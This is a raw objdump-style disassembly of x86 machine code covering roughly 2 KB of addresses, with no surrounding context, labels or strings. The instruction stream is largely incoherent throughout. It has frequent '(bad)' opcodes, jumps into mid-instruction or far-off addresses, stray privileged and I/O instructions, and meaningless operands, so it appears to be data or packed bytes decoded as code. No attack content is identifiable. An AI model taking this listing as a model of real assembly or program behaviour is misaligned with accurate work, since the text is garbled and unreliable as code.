  4315bd:	dec    edi
  4315be:	or     BYTE PTR [edi+0x1],0x85
  4315c2:	add    bh,bh
  4315c4:	add    bh,bh
  4315c6:	(bad)  
  4315c7:	icebp  
  4315c8:	ret    
  4315c9:	dec    edi
  4315ca:	inc    ebp
  4315cb:	xchg   ebp,eax
  4315cc:	jne    0x4315cc
  4315ce:	mov    edi,edi
  4315d0:	cld    
  4315d1:	xor    BYTE PTR [ecx+0x500155],cl
  4315d7:	push   ebp
  4315d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315de:	add    BYTE PTR [ebp+0x35e90f50],al
  4315e4:	add    al,BYTE PTR [eax]
  4315e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315ec:	add    ah,ch
  4315ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4315f4:	jmp    0xdf18ee
  4315f9:	(bad)  
  4315fa:	nop    ecx
  4315fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431603:	cmp    ecx,DWORD PTR [ebp-0x64]
  431606:	mov    eax,edi
  431608:	mov    ebx,DWORD PTR [eax+edx*2]
  43160b:	add    eax,0x45fef885
  431610:	dec    DWORD PTR [ebx+0x339445]
  431616:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43161c:	dec    DWORD PTR [ebx-0x460f0375]
  431622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431623:	add    esi,edi
  431625:	add    bh,bh
  431627:	rdpmc  
  431629:	add    BYTE PTR [ebx],0x1
  43162c:	mov    DWORD PTR [eax],eax
  43162e:	add    al,0x45
  431630:	dec    DWORD PTR [ecx-0x360b3373]
  431636:	dec    DWORD PTR [esi]
  431638:	push   eax
  431639:	jne    0x431680
  43163b:	mov    esi,DWORD PTR [ebx]
  43163d:	cld    
  43163e:	add    ebp,ebp
  431640:	push   eax
  431641:	inc    DWORD PTR [ebp-0x75]
  431644:	add    eax,0x800e4
  431649:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43164f:	mov    DWORD PTR [ecx],eax
  431651:	sbb    al,0x0
  431653:	leave  
  431654:	test   DWORD PTR [edi-0x2],eax
  431657:	jne    0x431658
  431659:	call   0xff44015e
  43165e:	xor    BYTE PTR [ebp+0x4d],al
  431661:	mov    edi,edi
  431663:	enter  0x8,0x4d
  431667:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43166d:	mov    eax,DWORD PTR [eax]
  43166f:	cld    
  431670:	add    DWORD PTR [ecx],ebx
  431672:	inc    ebp
  431673:	dec    ebp
  431674:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43167a:	inc    eax
  43167b:	dec    DWORD PTR [ecx-0x270375]
  431681:	add    BYTE PTR [ebx-0x39d72701],cl
  431687:	xchg   ecx,eax
  431688:	ret    
  431689:	add    BYTE PTR [ebp-0x830075],al
  43168f:	add    BYTE PTR [ebp-0x75],al
  431692:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431698:	lea    edi,[edi-0xc]
  43169b:	add    bh,bh
  43169d:	mov    edx,DWORD PTR [eax-0x7b]
  4316a0:	inc    ebp
  4316a1:	rdpmc  
  4316a3:	jne    0x4316a8
  4316a5:	add    BYTE PTR [eax-0x75],dl
  4316a8:	inc    ebp
  4316a9:	clc    
  4316aa:	add    eax,0x400009
  4316af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316b5:	mov    eax,DWORD PTR [ecx]
  4316b7:	in     al,dx
  4316b8:	add    dh,al
  4316ba:	test   ebx,eax
  4316bc:	inc    BYTE PTR [ebp-0xff0001]
  4316c2:	add    BYTE PTR [ebp-0x43],al
  4316c5:	cmp    esi,0xfffffff8
  4316c8:	(bad)  
  4316c9:	push   DWORD PTR [eax]
  4316cb:	add    BYTE PTR [ebp-0x3a],dl
  4316ce:	test   ebx,eax
  4316d0:	je     0x431657
  4316d2:	mov    edi,edi
  4316d4:	sbb    al,0xff
  4316d6:	test   DWORD PTR gs:[eax],eax
  4316d9:	(bad)  
  4316da:	js     0x4316db
  4316dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316e2:	sub    eax,ebx
  4316e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ea:	add    eax,DWORD PTR [eax]
  4316ec:	dec    ebp
  4316ed:	push   eax
  4316ee:	mov    al,BYTE PTR [ebp+0x1]
  4316f1:	mov    eax,DWORD PTR [ebp-0x68]
  4316f4:	mov    eax,DWORD PTR [eax]
  4316f6:	sbb    bh,al
  4316f8:	or     ah,dh
  4316fa:	dec    ebp
  4316fb:	inc    DWORD PTR [eax+0x4]
  4316fe:	push   ecx
  4316ff:	add    BYTE PTR [edx-0x1],dh
  431702:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431708:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431712:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431718:	push   ecx
  431719:	cmp    BYTE PTR [ebx],al
  43171b:	inc    ebp
  43171c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431722:	(bad)  
  431723:	(bad)  
  431724:	in     al,0xff
  431726:	add    BYTE PTR [ebp+0x0],al
  431729:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43172f:	add    al,bh
  431731:	(bad)  
  431732:	jmp    0x8d85:0x74b0558d
  431739:	dec    DWORD PTR [eax]
  43173b:	call   DWORD PTR [ebp-0x7b]
  43173e:	mov    edi,esi
  431740:	lock call DWORD PTR [ebp-0x75]
  431744:	mov    esi,esp
  431746:	mov    ah,0xc6
  431748:	mov    bh,0xc3
  43174a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431750:	add    DWORD PTR [eax],0x450050ff
  431756:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43175c:	inc    edi
  43175e:	push   esp
  431760:	jmp    0xcd00:0x660481ff
  431767:	mov    DWORD PTR [ebx],esi
  431769:	clc    
  43176a:	cmp    edi,0xff9cff3a
  431770:	jne    0x43177a
  431772:	mov    eax,eax
  431774:	add    esi,DWORD PTR [eax]
  431776:	int3   
  431777:	inc    ebp
  431778:	cmp    al,0x83
  43177a:	add    BYTE PTR [eax],bl
  43177c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431782:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431788:	mov    edi,eax
  43178a:	cmp    BYTE PTR [ebp+0x45],cl
  43178d:	jmp    0x43171a
  43178f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431792:	inc    ebp
  431793:	or     al,0x2
  431795:	dec    DWORD PTR [ebp+0x18]
  431798:	jne    0x4317ef
  43179a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317a0:	mov    edi,DWORD PTR [ebx]
  4317a2:	in     al,0x50
  4317a4:	xchg   ecx,eax
  4317a5:	jmp    0x34366aa
  4317aa:	adc    al,0x8b
  4317ac:	inc    ebp
  4317ad:	mov    al,ds:0x8b04008b
  4317b2:	push   ebp
  4317b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317b9:	push   ebp
  4317ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317c0:	inc    ebp
  4317c1:	dec    ebp
  4317c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4317c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4317ce:	add    al,0x0
  4317d0:	add    BYTE PTR [eax],al
  4317d2:	mov    eax,edx
  4317d4:	push   eax
  4317d5:	rol    DWORD PTR [ebp-0xf0177],1
  4317db:	bound  eax,QWORD PTR [ebp+0x50]
  4317de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ea:	mov    al,0xf
  4317ec:	test   DWORD PTR [edx],edx
  4317ee:	call   DWORD PTR [ebp-0x7a0001]
  4317f4:	(bad)  
  4317f5:	loop   0x4317f6
  4317f7:	jnp    0xc6990bfd
  4317fd:	mov    eax,ebx
  4317ff:	cmp    al,0x8b
  431801:	(bad)  
  431802:	cld    
  431803:	shr    esi,0xc
  431806:	add    dl,al
  431808:	push   eax
  431809:	lea    eax,[ebp-0x1]
  43180c:	mov    edx,esi
  43180e:	cwde   
  43180f:	cli    
  431810:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431816:	or     BYTE PTR [eax],cl
  431818:	inc    ebp
  431819:	dec    ebp
  43181a:	inc    DWORD PTR [ebx+0x74803914]
  431820:	add    DWORD PTR [ebx+0x451800],ecx
  431826:	call   DWORD PTR [eax+edx*1]
  431829:	add    ecx,DWORD PTR [ebp-0x34]
  43182c:	push   edi
  43182d:	adc    al,0x8
  43182f:	mov    edx,DWORD PTR [ebp-0x14]
  431832:	mov    ecx,DWORD PTR [ebp+0x18]
  431835:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431839:	inc    DWORD PTR [eax+esi*8]
  43183c:	inc    ebp
  43183d:	stos   BYTE PTR es:[edi],al
  43183e:	mov    edx,DWORD PTR [ebp-0x4]
  431841:	add    DWORD PTR [ebp-0x1c],eax
  431844:	mov    edx,DWORD PTR [ebp-0x70]
  431847:	cmp    eax,DWORD PTR [eax]
  431849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43184a:	mov    eax,DWORD PTR [eax]
  43184c:	cld    
  43184d:	jae    0x4317cf
  43184f:	add    eax,DWORD PTR [ecx]
  431851:	clc    
  431852:	add    BYTE PTR [eax+0x30],dl
  431855:	mov    DWORD PTR [ecx],esi
  431857:	clc    
  431858:	pop    ds
  431859:	inc    ebp
  43185a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431860:	(bad)  
  431861:	push   DWORD PTR [edi]
  431863:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431869:	(bad)  
  43186a:	jae    0x43186b
  43186c:	mov    eax,DWORD PTR [ebp-0x740175]
  431872:	sub    eax,DWORD PTR [eax]
  431874:	add    eax,DWORD PTR [eax]
  431876:	mov    DWORD PTR [ecx+0x5f],eax
  431879:	mov    DWORD PTR [ebx-0x4],ebx
  43187c:	ret    0xff
  43187f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431885:	ret    
  431886:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43188c:	add    BYTE PTR [ebp-0x7d],al
  43188f:	mov    DWORD PTR [eax],eax
  431891:	add    al,0x84
  431893:	inc    DWORD PTR [ecx]
  431895:	lea    eax,[eax]
  431897:	hlt    
  431898:	sar    bh,cl
  43189a:	test   BYTE PTR [eax+0x1],dl
  43189d:	inc    ebp
  43189e:	add    BYTE PTR [ebx],dh
  4318a0:	test   BYTE PTR [ebx],0x84
  4318a3:	push   eax
  4318a4:	add    BYTE PTR [ebp+0x0],al
  4318a7:	add    eax,0x86
  4318ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318b2:	add    BYTE PTR [ecx],al
  4318b4:	add    BYTE PTR [eax],al
  4318b6:	mov    esi,0x550030
  4318bb:	mov    ecx,DWORD PTR [edi]
  4318bd:	cld    
  4318be:	fidiv  DWORD PTR [ebp+0x0]
  4318c1:	mov    edi,DWORD PTR [ecx]
  4318c3:	xor    BYTE PTR [eax+eax*1],0x84
  4318c7:	add    eax,DWORD PTR [eax]
  4318c9:	sbb    BYTE PTR [eax],al
  4318cb:	jne    0x43187e
  4318cd:	mov    eax,DWORD PTR [ecx]
  4318cf:	sbb    BYTE PTR [eax],al
  4318d1:	mov    DWORD PTR [ebp-0x1],esp
  4318d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318da:	ret    0xb7fc
  4318dd:	dec    ebp
  4318de:	or     al,0x89
  4318e0:	dec    ebp
  4318e1:	cld    
  4318e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318e6:	add    edi,esp
  4318e8:	seto   BYTE PTR [esi-0x72ffffff]
  4318ef:	inc    ebp
  4318f0:	adc    al,0x8b
  4318f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318f9:	cmp    DWORD PTR [edi+0x72],edx
  4318fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431902:	gs cmp al,0x0
  431905:	je     0x4318dd
  431907:	push   eax
  431908:	sar    BYTE PTR [eax],1
  43190a:	mov    bh,0x3e
  43190c:	push   cs
  43190d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431913:	add    DWORD PTR [ecx+0x12],ebp
  431916:	dec    edx
  431917:	(bad)  
  431918:	mov    eax,edx
  43191a:	in     al,dx
  43191b:	adc    DWORD PTR [ecx],esi
  43191d:	pop    esi
  43191e:	inc    ecx
  43191f:	leave  
  431920:	or     DWORD PTR [eax],ebx
  431922:	gs push ebp
  431924:	add    ah,ch
  431926:	into   
  431927:	in     al,dx
  431928:	enter  0xb756,0xf0
  43192c:	push   cs
  43192d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431937:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43193d:	jnp    0x74439e45
  431943:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431949:	add    BYTE PTR [edi],cl
  43194b:	mov    edi,DWORD PTR [ecx-0x78]
  43194e:	ltr    WORD PTR [ecx-0x7b]
  431952:	dec    DWORD PTR [edi]
  431954:	clc    
  431955:	out    0x45,eax
  431957:	add    BYTE PTR [eax],cl
  431959:	cmp    ebx,0xffffff8c
  43195c:	jge    0x43195e
  43195e:	jb     0x431970
  431960:	je     0x5219e0
  431966:	pop    edx
  431967:	push   esi
  431968:	mov    ecx,DWORD PTR [edi]
  43196a:	in     al,dx
  43196b:	rol    DWORD PTR [ebp+0x0],1
  43196e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431975:	cmp    DWORD PTR [ecx],0xfffffff0
  431978:	hlt    
  431979:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43197f:	(bad)  
  431981:	push   eax
  431982:	jns    0xb842fe00
  431988:	lock push cs
  43198a:	ror    edx,0x3
  43198d:	test   BYTE PTR [ecx+0x5500e800],cl
  431993:	dec    eax
  431994:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431998:	(bad)  
  431999:	mov    esi,0x7f33ff5f
  43199e:	inc    eax
  43199f:	test   DWORD PTR [edx],eax
  4319a1:	je     0x431963
  4319a3:	mov    ecx,ecx
  4319a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319a9:	and    eax,DWORD PTR [eax+0xf0103]
  4319af:	jp     0x43199d
  4319b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319b5:	add    edx,DWORD PTR [edi+0x74]
  4319b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4319c4:	je     0x431949
  4319c6:	cmp    eax,edi
  4319c8:	js     0x4319ed
  4319ca:	add    eax,0xeb0fc003
  4319cf:	jns    0x43195c
  4319d1:	vmread DWORD PTR [ecx+0x45],ebx
  4319d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319db:	adc    al,0x8b
  4319dd:	jge    0x4319f3
  4319df:	mov    edi,DWORD PTR [eax-0x4]
  4319e2:	add    edi,DWORD PTR [edi]
  4319e4:	or     bh,bh
  4319e6:	push   ebp
  4319e7:	push   es
  4319e8:	mov    DWORD PTR [ebp-0x4],ebx
  4319eb:	add    edi,esi
  4319ed:	pop    es
  4319ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319f4:	mov    DWORD PTR [esp+esi*8],ecx
  4319f7:	inc    ebp
  4319f8:	pop    ebp
  4319f9:	xor    DWORD PTR [esi-0x4],0x3b
  4319fd:	add    edx,DWORD PTR [ecx+edi*1]
  431a00:	push   es
  431a01:	clc    
  431a02:	mov    bh,0xdb
  431a04:	jp     0x4319bd
  431a06:	add    cl,BYTE PTR [esi]
  431a08:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a0e:	test   edi,edi
  431a10:	je     0x431a06
  431a12:	mov    eax,ecx
  431a14:	or     BYTE PTR [ebx],al
  431a16:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a1c:	jbe    0x431a90
  431a1e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a24:	add    ecx,DWORD PTR [esi]
  431a26:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a2c:	add    eax,DWORD PTR [ebx-0x287af783]
  431a32:	je     0x431a81
  431a34:	mov    DWORD PTR [ecx],edi
  431a36:	mov    esi,eax
  431a38:	hlt    
  431a39:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a40:	jb     0x431a02
  431a42:	jmp    0x431a2f
  431a44:	xor    esi,DWORD PTR [ebx]
  431a46:	pop    edi
  431a47:	pop    esi
  431a48:	pop    ebx
  431a49:	ret    
  431a4a:	ret    0x8b
  431a4d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a53:	xor    DWORD PTR ds:0x89339c0c,0x56
  431a5a:	cld    
  431a5b:	cmp    DWORD PTR [ebp+0xf],eax
  431a5e:	xor    al,0x85
  431a60:	pushf  
  431a61:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431a67:	ret    
  431a68:	mov    edi,DWORD PTR [esi-0x4]
  431a6b:	pop    eax
  431a6c:	dec    ebp
  431a6d:	jne    0x4319fa
  431a6f:	xor    edi,esp
  431a71:	inc    eax
  431a72:	dec    ebp
  431a73:	jbe    0x431ac8
  431a75:	inc    eax
  431a76:	pop    ebp
  431a77:	add    edx,DWORD PTR [esi+0x8]
  431a7a:	push   ebx
  431a7b:	dec    eax
  431a7c:	push   ecx
  431a7d:	mov    eax,edi
  431a7f:	and    al,0xf0
  431a81:	jo     0x431a6e
  431a83:	mov    eax,DWORD PTR [ebx]
  431a85:	sbb    BYTE PTR [ebp+0x4d],cl
  431a88:	mov    eax,DWORD PTR [ebx]
  431a8a:	nop
  431a8b:	or     BYTE PTR [eax],al
  431a8d:	jne    0x431ae6
  431a8f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431a95:	cld    
  431a96:	xor    edi,edi
  431a98:	add    edi,DWORD PTR [ebp+0x3]
  431a9b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431aa1:	js     0x431a27
  431aa3:	jae    0x431aa7
  431aa5:	(bad)  
  431aa7:	xor    al,0x5d
  431aa9:	jmp    0x431a36
  431aab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431ab2:	fdecstp 
  431ab4:	test   BYTE PTR [edi],ah
  431ab6:	add    bh,BYTE PTR [ebp+0x0]
  431ab9:	add    ebx,DWORD PTR [ebp-0x77]
  431abc:	mov    edi,eax
  431abe:	cmp    al,0x0
  431ac1:	adc    dh,BYTE PTR [ebx]
  431ac3:	jge    0x431ac8
  431ac5:	mov    edi,DWORD PTR [ebx]
  431ac7:	jl     0x431ad8
  431ac9:	clc    
  431aca:	dec    edi
  431acb:	jge    0x431acd
  431acd:	mov    eax,DWORD PTR [ebx]
  431acf:	jb     0x431ad9
  431ad1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ad4:	mov    edi,edi
  431ad6:	xor    edx,DWORD PTR [eax]
  431ad8:	add    edi,DWORD PTR [ebx]
  431ada:	mov    DWORD PTR [ebp-0x10],edi
  431add:	inc    edi
  431ade:	pop    ebp
  431adf:	jge    0x431b1c
  431ae1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ae5:	mov    edx,0xc05d87f0
  431aea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aee:	fimul  WORD PTR [eax]
  431af0:	fist   WORD PTR [ebp+0x1c]
  431af3:	in     al,dx
  431af4:	jne    0x431ae2
  431af6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431afc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b00:	fdivp  st(0),st
  431b02:	fild   WORD PTR [ebp+0x4510f85c]
  431b08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b0e:	inc    ebp
  431b0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b15:	mov    ebp,DWORD PTR [ebx-0x4]
  431b18:	adc    al,0x8b
  431b1a:	rcl    DWORD PTR [eax],0x48
  431b1d:	mov    esi,0x7080803
  431b22:	fiadd  WORD PTR [ebp+0x4d]
  431b25:	(bad)  
  431b26:	mov    edx,DWORD PTR [edx-0x4]
  431b29:	mov    edx,DWORD PTR [ebp-0x4]
  431b2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b32:	mov    DWORD PTR [edi+0x872dc],edi
  431b38:	xlat   BYTE PTR ds:[ebx]
  431b39:	into   
  431b3a:	ffreep st(6)
  431b3c:	retf   0x6c7
  431b3f:	iret   
  431b40:	dec    ebp
  431b41:	inc    ebp
  431b42:	mov    DWORD PTR [ebx],edi
  431b44:	fmul   QWORD PTR [edi]
  431b46:	dec    ebp
  431b47:	jnp    0x431b7c
  431b49:	add    BYTE PTR [ebx],al
  431b4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b4e:	inc    ebp
  431b4f:	dec    ebp
  431b50:	lea    esi,[ebx]
  431b52:	add    DWORD PTR [ebx],eax
  431b54:	jb     0x431b91
  431b56:	add    BYTE PTR [edi],cl
  431b58:	inc    ebp
  431b59:	imul   eax,edi,0x858bd800
  431b5f:	cld    
  431b60:	clc    
  431b61:	mov    DWORD PTR [ebp+0x0],eax
  431b64:	inc    DWORD PTR [eax]
  431b66:	or     al,0xde
  431b68:	sbb    bh,0x1
  431b6b:	retf   
  431b6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b73:	dec    ebp
  431b74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b7a:	enter  0x12de,0xdf
  431b7e:	inc    ebp
  431b7f:	pop    ebp
  431b80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b86:	add    DWORD PTR [edx],edx
  431b88:	add    BYTE PTR [ebp+0x50],dl
  431b8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431b98:	loopne 0x431bb1
  431b9a:	cdq    
  431b9b:	push   ebp
  431b9c:	clc    
  431b9d:	mov    eax,DWORD PTR [ebp-0x4]
  431ba0:	xor    edx,edx
  431ba2:	add    esi,DWORD PTR [ebx]
  431ba4:	cmp    eax,DWORD PTR [ebx]
  431ba6:	hlt    
  431ba7:	cmp    DWORD PTR [ebx],esp
  431ba9:	or     al,BYTE PTR [ebp+0xf]
  431bac:	mov    eax,DWORD PTR [edx]
  431bae:	loopne 0x431bb0
  431bb0:	(bad)  
  431bb1:	mov    ecx,esi
  431bb3:	cld    
  431bb4:	pushf  
  431bb5:	pop    ebp
  431bb6:	call   0x10c0:0x8bf0328b
  431bbd:	add    eax,DWORD PTR [eax+0x10018b]
  431bc3:	dec    ebp
  431bc4:	iret   
  431bc5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431bcb:	dec    ebp
  431bcc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431bd2:	(bad)  
  431bd3:	iret   
  431bd4:	inc    ebp
  431bd5:	(bad)  
  431bd6:	jne    0x431c25
  431bd8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bde:	(bad)  
  431bdf:	cmp    ebx,eax
  431be1:	je     0x431b69
  431be3:	add    edi,edi
  431be5:	or     bh,bh
  431be7:	dec    ebp
  431be8:	inc    ebp
  431be9:	mov    esi,DWORD PTR [ebx]
  431beb:	cld    
  431bec:	add    ecx,esi
  431bee:	cmp    ecx,DWORD PTR [eax-0xc]
  431bf1:	mov    edx,DWORD PTR [edi]
  431bf3:	or     BYTE PTR [ebp-0x7c],al
  431bf6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431bfc:	test   BYTE PTR [edx+ebx*4],cl
  431bff:	inc    ebp
  431c00:	xor    bh,BYTE PTR [eax]
  431c02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c09:	jne    0x431bd2
  431c0b:	mov    ebp,esp
  431c0d:	fcomp  DWORD PTR [ebx]
  431c0f:	add    BYTE PTR [ecx],al
  431c11:	inc    DWORD PTR [ebp-0x75]
  431c14:	(bad)  
  431c15:	cld    
  431c16:	add    al,0xce
  431c18:	mov    ecx,edi
  431c1a:	cld    
  431c1b:	inc    ebp
  431c1c:	fidivr WORD PTR [ebx]
  431c1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431c21:	mov    eax,DWORD PTR [eax]
  431c23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c29:	fadd   st,st(7)
  431c2b:	add    BYTE PTR [ebp-0x1],al
  431c2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431c31:	inc    ebp
  431c32:	mov    bh,0xc7
  431c35:	loopne 0x431c7c
  431c37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c3d:	sbb    al,0x33
  431c3f:	pushf  
  431c40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c46:	mov    eax,edi
  431c48:	cwde   
  431c49:	inc    ebp
  431c4a:	inc    ebp
  431c4b:	jne    0x431bd8
  431c4d:	mov    esp,esp
  431c4f:	clc    
  431c50:	add    al,0x4d
  431c52:	mov    DWORD PTR [ebx],esi
  431c54:	or     al,0x33
  431c56:	inc    ebp
  431c57:	lea    ecx,[ebx-0x398d13fd]
  431c5d:	add    bh,al
  431c5f:	inc    ebp
  431c60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c67:	add    ebp,esp
  431c69:	shufps xmm1,xmm3,0xc7
  431c6d:	(bad)  
  431c6e:	jmp    0x74885797
  431c73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c79:	hlt    
  431c7a:	mov    ecx,DWORD PTR [edi]
  431c7c:	fadd   DWORD PTR [ebp+0x0]
  431c7f:	xor    ecx,DWORD PTR [edi]
  431c81:	add    ecx,ecx
  431c83:	cmp    edi,edi
  431c85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c89:	(bad)  
  431c8a:	jmp    0x431c17
  431c8c:	mov    edi,esp
  431c8e:	or     al,0xc6
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	mov    eax,DWORD PTR [ebp+0x10]
  431c95:	jne    0x431c20
  431c97:	mov    eax,DWORD PTR [ecx]
  431c99:	clc    
  431c9a:	add    BYTE PTR [ebp-0x40],cl
  431c9d:	xor    edx,DWORD PTR [eax-0x73]
  431ca0:	jne    0x431ca3
  431ca2:	push   DWORD PTR [edx+0x8]
  431ca5:	add    BYTE PTR [ebp+0x45],al
  431ca8:	mov    ebp,ecx
  431caa:	cld    
  431cab:	add    BYTE PTR [ebp+0x0],cl
  431cae:	xor    eax,DWORD PTR [ebp+0x3]
  431cb1:	lea    edi,[ebx]
  431cb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cb9:	sub    eax,0x5d330e4d
  431cbe:	lea    esi,[ebx]
  431cc0:	add    DWORD PTR [ebx],eax
  431cc2:	jb     0x431cad
  431cc4:	add    BYTE PTR [eax],al
  431cc6:	inc    ebp
  431cc7:	add    bl,ch
  431cc9:	inc    ebp
  431cca:	mov    esi,DWORD PTR [ebx]
  431ccc:	or     al,0x3
  431cce:	(bad)  
  431ccf:	mov    edi,eax
  431cd1:	in     al,dx
  431cd2:	scas   eax,DWORD PTR es:[edi]
  431cd3:	inc    ebp
  431cd4:	mov    esi,DWORD PTR [ebx]
  431cd6:	in     al,0x3
  431cd8:	add    al,0x89
  431cda:	mov    ecx,DWORD PTR [eax+edi*8]
  431cdd:	dec    ebp
  431cde:	(bad)  
  431cdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431ce6:	mov    ecx,eax
  431ce8:	cld    
  431ce9:	push   es
  431cea:	dec    ebp
  431ceb:	add    al,0x33
  431ced:	mov    DWORD PTR [ebx],eax
  431cef:	in     al,dx
  431cf0:	cmp    DWORD PTR [ebp-0x67],eax
  431cf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cf9:	mov    edx,DWORD PTR [ebp-0x4]
  431cfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cff:	xor    eax,DWORD PTR [ebp+0x3]
  431d02:	cmp    DWORD PTR [ebx],0x8b327499
  431d08:	xor    edi,esp
  431d0a:	jmp    0xff771a5c
  431d0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431d12:	xor    ebx,DWORD PTR [edi]
  431d14:	add    eax,ecx
  431d16:	cmp    ebx,DWORD PTR [eax]
  431d18:	mov    ecx,DWORD PTR [ebp-0x4]
  431d1b:	mov    ecx,DWORD PTR [eax]
  431d1d:	adc    BYTE PTR [ebp-0x80],al
  431d20:	jmp    0x431d23
  431d22:	mov    eax,DWORD PTR [eax]
  431d24:	cld    
  431d25:	mov    bh,0xc6
  431d27:	push   ecx
  431d28:	(bad)  
  431d29:	jne    0x431d89
  431d2b:	dec    ecx
  431d2d:	or     BYTE PTR [ecx+ebx*1],cl
  431d30:	push   ebp
  431d31:	inc    ebp
  431d32:	in     al,dx
  431d33:	add    ebp,esp
  431d35:	or     bh,al
  431d37:	dec    ebp
  431d38:	cld    
  431d39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431d43:	dec    DWORD PTR [ebx+0x45510cf4]
  431d49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431d4f:	mov    edx,DWORD PTR [ecx+0xc]
  431d52:	xor    eax,esi
  431d54:	mov    edx,0xc172c7
  431d59:	inc    ebp
  431d5a:	mov    esi,DWORD PTR [ebp+0x8]
  431d5d:	mov    eax,edx
  431d5f:	call   0x84c7e454
  431d64:	add    DWORD PTR [edx-0x76bace00],ebx
  431d6a:	mov    ebp,eax
  431d6c:	or     BYTE PTR [eax],dl
  431d6e:	jo     0x431dbd
  431d70:	push   edi
